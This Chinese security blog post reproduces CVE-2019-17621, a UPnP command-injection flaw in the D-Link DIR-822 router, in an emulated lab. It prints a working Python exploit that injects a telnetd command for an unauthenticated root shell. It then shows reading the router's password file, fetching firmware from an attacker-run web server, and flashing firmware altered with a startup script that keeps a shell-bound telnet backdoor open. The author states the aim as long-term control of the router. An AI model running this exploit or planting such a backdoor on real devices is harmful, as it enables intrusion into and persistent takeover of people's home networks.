> 原文链接: https://www.anquanke.com//post/id/232845 


# IoT设备漏洞复现到固件后门植入


                                阅读量   
                                **284132**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0112b758ab28f00eae.jpg)](https://p3.ssl.qhimg.com/t0112b758ab28f00eae.jpg)



作者：维阵漏洞研究员—km1ng**<br>**

## 一、简述

本次分析的漏洞为cve-2019-17621,是一个远程代码执行漏洞（无需身份验证，一般处于局域网）。

因为网上多是对Dlink-859的分析并且Dlink859已有补丁，所以这里采用对Dlink822进行分析。网上的文章多是分析完毕证明有这个漏洞就结束，本篇文章还将介绍如何仿真路由器，在证明漏洞存在后，如何更改固件、刷新固件并且长久驻留的一个解决方案。

UPNP（Universal Plug and Play）即通用即插即用协议,是为了实现电脑与智能的电器设备对等网络连接的体系结构。而内网地址与网络地址的转换就是基于此协议的，因此只要我们的路由器支持upnp，那么我们就可以借此提高点对点传输速度。



## 二、分析环境

|环境<th style="text-align: left;">版本</th>
|------
|vmware<td style="text-align: left;">15.0.0</td>
|ubuntu<td style="text-align: left;">1604_x64</td>
|dlink-822<td style="text-align: left;">1.03B03(硬件版本A1)</td>
|binwalk<td style="text-align: left;">2.2.1</td>
|IDA<td style="text-align: left;">7.5</td>



## 三、漏洞分析

下载固件:[http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822](http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822)

固件的MD5为27fd2601cc6ae24a0db7b1066da08e1e。

使用binwalk -e 命令解压固件。

```
binwalk -e DIR822A1_FW103WWb03.bin
```

使用file指令查看 squashfs-root/bin/busybox发现是mips架构的路由器,进入squashfs-root目录将htdocs/cgibin文件拷贝出来,放入IDA中分析。

genacgi_main函数是漏洞开始触发点，通过“REQUEST_URI”获取url后对其进行验证，然后进入sub_40FCE0。

[![](https://p1.ssl.qhimg.com/t010b889dc1ff5c080c.png)](https://p1.ssl.qhimg.com/t010b889dc1ff5c080c.png)

下图为sub_40FCE0函数，其中a1为上图中传入的url，通过xmldbc_ephp函数使用socket发送出去。

[![](https://p1.ssl.qhimg.com/t0116a5154a4156de7f.png)](https://p1.ssl.qhimg.com/t0116a5154a4156de7f.png)

数据现在由PHP文件`run.NOTIFY.php`进行处理，其中请求方法会被再次验证。

[![](https://p0.ssl.qhimg.com/t01d892db07fdd80c67.png)](https://p0.ssl.qhimg.com/t01d892db07fdd80c67.png)

该脚本会调用PHP函数`GENA_subscribe_new()`，并向其传递cgibin程序中`genacgi_main()`函数获得的变量，还包括变量`SHELL_FILE`。

文件：gena.php，函数`GENA_subscribe_new()`。

[![](https://p5.ssl.qhimg.com/t013a3430f360178844.png)](https://p5.ssl.qhimg.com/t013a3430f360178844.png)

`GENA_subscribe_new()`函数并不修改`$shell_file`变量。

gena.php，`GENA_notify_init()`函数。

[![](https://p1.ssl.qhimg.com/t018196e277cbf79db0.png)](https://p1.ssl.qhimg.com/t018196e277cbf79db0.png)

这就是变量`SHELL_FILE`结束的地方，它是通过调用PHP函数`fwrite()`创建的新文件的名称的一部分。这个函数被使用了两次：第一次创建文件，它的名字来自我们控制的`SHELL_FILE`变量以及`getpid()`的输出。第二次调用`fwrite()`向这个文件添加了一行，其中还使用了`rm`系统命令，以删除它自己。为了进行攻击，我们只需要插入一个反引号包裹的系统命令，然后将其注入到shell脚本中。



## 四、漏洞验证

exp如下，通过这个漏洞，我们可以利用telnet服务来进行访问。因为这个漏洞是UPnP协议漏洞，一般处于局域网才能使用。

```
import socket
import os
from time import sleep
# Exploit By Miguel Mendez &amp; Pablo Pollanco
def httpSUB(server, port, shell_file):
    print('\n[*] Connection `{`host`}`:`{`port`}`'.format(host=server, port=port))
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(str(request))
    results = con.recv(4096)
    sleep(1)
    print('[*] Running Telnetd Service')
    sleep(1)
    print('[*] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')
serverInput = '192.168.0.1'
portInput = 49152
httpSUB(serverInput, portInput, '`telnetd -p 9999 &amp;`')
```

这里使用firmware-analysis-plus框架仿真路由器，地址：[https://github.com/liyansong2018/firmware-analysis-plus](https://github.com/liyansong2018/firmware-analysis-plus)

```
python3 fat.py -q git/firmware-analysis-plus/qemu-builds/2.5.0/ /home/admin-dir/bin/dlink/DIR822A1_FW103WWb03.bin
```

[![](https://p2.ssl.qhimg.com/t01dc744e805cd80f42.png)](https://p2.ssl.qhimg.com/t01dc744e805cd80f42.png)

有可能使用浏览器访问192.168.0.1遇到不安全的TLS警告，直接启用即可。

使用nmap扫描端口，可以发现49152端口是默认开启的。

[![](https://p5.ssl.qhimg.com/t01f227d1fbc3a86e19.png)](https://p5.ssl.qhimg.com/t01f227d1fbc3a86e19.png)

使用exp测试仿真路由器，nmap扫描可以发现9999端口已被打开，并且成功登录telnet。

[![](https://p4.ssl.qhimg.com/t01f70fa4167db21758.png)](https://p4.ssl.qhimg.com/t01f70fa4167db21758.png)



## 五、 固件更新

更新固件使用仿真路由器有一些小缺陷，没有这款路由器的也可以继续使用仿真路由器做更新固件。更新固件的操作使用物理路由器。先介绍一种比较简单的办法，通过telnet登录822路由器，cat /var/passwd 路由器里面存放这路由器的账号密码，通过web端更新固件。

[![](https://p4.ssl.qhimg.com/t01a0648588e5820146.png)](https://p4.ssl.qhimg.com/t01a0648588e5820146.png)

[![](https://p5.ssl.qhimg.com/t0151d9daef6eafb11a.png)](https://p5.ssl.qhimg.com/t0151d9daef6eafb11a.png)

手动登录路由器telnet，wget固件然后升级，这里给出822路由器升级脚本为squashfs-root/usr/sbin/fw_upgrade

[![](https://p5.ssl.qhimg.com/t01b9a5ff3cc16216df.png)](https://p5.ssl.qhimg.com/t01b9a5ff3cc16216df.png)

下面在看一下etc/events/FWUPDATER.sh文件里面的操作。

[![](https://p1.ssl.qhimg.com/t015bdf7193cea43be2.png)](https://p1.ssl.qhimg.com/t015bdf7193cea43be2.png)

并没有什么特别的操作，这里选择直接调用usr/sbin/fw_upgrade脚本文件，下面为笔者更新固件脚本，读者只需要少量更改即可使用。

```
cd
cd /var
wget http://192.168.0.36:8000/DIR822A1_FW103WWb03.bin
mv DIR822A1_FW103WWb03.bin firmware.seama
chmod 777 firmware.seama
mount -t ramfs ramfs /proc
mkdir /proc/driver
cd
/usr/sbin/fw_upgrade /var/firmware.seama
```

现在更新脚本有了，也能登录上去，可以制作新的固件添加自己的功能。<br>
推荐使用firmware-mod-kit框架，git地址：[https://github.com/rampageX/firmware-mod-kit](https://github.com/rampageX/firmware-mod-kit)

```
/firmware-mod-kit/extract-firmware.sh DIR822A1_FW103WWb03.bin
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0191ee1a30595ec4ba.png)

现在会在其目录下发现fmk目录，进入fmk/rootfs可以见到路由器的文件系统。进入etc/init0.d/会发现rcS文件，对固件的改动就在这里面。

[![](https://p5.ssl.qhimg.com/t0144eca6b23f3f2d4e.png)](https://p5.ssl.qhimg.com/t0144eca6b23f3f2d4e.png)

追加rcS文件/etc/init0.d/fir.sh，fir.sh为自己创建的脚本。

[![](https://p4.ssl.qhimg.com/t017be3f193264ef870.png)](https://p4.ssl.qhimg.com/t017be3f193264ef870.png)

下面为fir.sh脚本内容：

```
#!/bin/sh
min=1
while :
do
    telnetd -l /bin/sh -p 8888
    sleep 1h
    echo $min
done
```

返回fmk的同级目录，使用firmware-mod-kit/build-firmware.sh即可完成固件打包。

[![](https://p1.ssl.qhimg.com/t01c92547327a512f6a.png)](https://p1.ssl.qhimg.com/t01c92547327a512f6a.png)

python -m SimpleHTTPServer 8080搭建起一个简单的web服务。将改好的dlink.sh和固件放入web服务目录下。

使用漏洞利用登录到telnet，进入tmp目录使用wget请求dlink.sh.

[![](https://p5.ssl.qhimg.com/t01a704379afad4183d.png)](https://p5.ssl.qhimg.com/t01a704379afad4183d.png)

运行dlink.sh，固件刷新需要稍等几分钟。

[![](https://p2.ssl.qhimg.com/t0179787e26554ff3ea.png)](https://p2.ssl.qhimg.com/t0179787e26554ff3ea.png)

[![](https://p0.ssl.qhimg.com/t015816c8a2c32ed235.png)](https://p0.ssl.qhimg.com/t015816c8a2c32ed235.png)

看上去是更新成功了，使用nmap扫描一下，固件里面的时间和版本号根据需求搜索更改即可。

[![](https://p4.ssl.qhimg.com/t01263aeb451bc51977.png)](https://p4.ssl.qhimg.com/t01263aeb451bc51977.png)

尝试使用这个端口号登录telnet，使用ps命令查看进程，发现固件已被更新。

[![](https://p2.ssl.qhimg.com/t015b2da1b36e7cff0c.png)](https://p2.ssl.qhimg.com/t015b2da1b36e7cff0c.png)



## 六、总结

本次漏洞分析利用，这个漏洞相对来说比较简单，在已爆出cve的情况下分析利用漏洞所占时间并不是很多，更多的时间是花在如：寻找验证固件更新脚本上。在成功利用漏洞的基础上，添加了后门提高了对路由器的长久稳定控制。

cve官网并未爆出，822A1版本的路由器收到影响，可以先使用IDA分析，确认有漏洞之后在使用仿真模拟确认路由器是否真的存在这个漏洞。这种方式快捷简单、无需时间等待和经济压力。
